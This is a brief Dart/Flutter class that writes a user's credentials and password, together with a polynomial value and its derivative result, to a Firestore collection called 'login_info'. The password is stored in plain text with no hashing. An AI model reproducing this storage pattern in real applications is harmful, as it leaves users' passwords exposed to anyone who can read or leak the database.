import 'package:cloud_firestore/cloud_firestore.dart';

class UploadToFirebase {
  uploadInputData(
    String password,
    String credentials,
    String polynomal,
    String calcValue,
  ) {
    Map<String, dynamic> data = {
      "credentials": credentials,
      "password": password,
      "polynomial_value": polynomal,
      "derivative_result": calcValue,
    };
    FirebaseFirestore.instance.collection("login_info").add(data);
  }
}
